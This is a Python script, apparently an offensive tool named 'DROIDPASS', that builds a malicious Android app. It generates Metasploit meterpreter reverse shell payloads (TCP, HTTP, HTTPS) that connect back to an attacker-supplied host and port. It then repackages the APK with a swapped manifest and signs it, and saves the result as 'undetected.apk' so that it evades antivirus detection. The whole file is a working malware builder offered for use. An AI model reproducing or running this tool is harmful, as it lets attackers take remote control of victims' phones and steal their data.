import os
import time
from requests import get
class bcolors:

    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'

banner = """
 ____  ____   ___ ___ ____  ____   _    ____ ____  
|  _ \|  _ \ / _ \_ _|  _ \|  _ \ / \  / ___/ ___| 
| | | | |_) | | | | || | | | |_) / _ \ \___ \___ \ 
| |_| |  _ <| |_| | || |_| |  __/ ___ \ ___) |__) |
|____/|_| \_\\___/___|____/|_| /_/   \_\____/____/ 
this tool created by youhacker
                                                   
"""
print(bcolors.OKGREEN,banner)

if os.system("which msfconsole >/dev/null 2>&1") == 0 and os.system("which apktool >/dev/null 2>&1") == 0:
    pass
else:
    print(bcolors.OKGREEN,"installing apktool and metasploit")
    time.sleep(2)
    os.system("apt-get install apktool && apt-get install metasploit-framework")
if os.path.exists( "/root/.android") == True:
    pass
else:
    os.system("mkdir ~/.android")
if os.path.isfile("/root/.android/debug.keystore") == False:
    print(bcolors.WARNING,"android debug key not found. generating 1 now")
    os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    print(bcolors.OKGREEN,"key generated")
else:
    pass


ip = get('https://api.ipify.org').text
#get public ip addr
print(bcolors.WARNING,"your public ip addr is",ip)
ip = input("entre lhost:")
port = input("entre lport:")
print(bcolors.OKBLUE,"""
available payloads
      1)android/meterpreter/reverse_tcp
      2)android/meterpreter/reverse_https
      3)android/meterpreter/reverse_http
      """)
def payload():
    x = int(input("choose option:"))
    if x == 1:
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" R> payload.apk")
    elif x == 2:
        os.system("msfvenom -p android/meterpreter/reverse_https lhost="+ip+" lport="+port+" R> payload.apk")
    elif x == 3:
        os.system("msfvenom -p android/meterpreter/reverse_http lhost="+ip+" lport="+port+" R> payload.apk")
    else:
        print("option not found")
        payload()
payload()
#Decompiling apk
os.system("apktool d payload.apk")
#removing old payload
os.system("rm -rf payload.apk && cd payload && rm AndroidManifest.xml ")
os.system("cp AndroidManifest.xml payload")
#Recompiling
os.system("apktool b payload")
os.system("cd payload/dist/ && mv payload.apk ..")
os.system("cd payload && mv payload.apk ..")
os.system("rm -rf payload")
#sign the apk
os.system("java -jar uber-apk-signer.jar --apks payload.apk")
os.system("rm payload.apk")
os.system("mv payload-aligned-debugSigned.apk undetected.apk")
print(bcolors.OKGREEN,"payload saved as undetected.apk")
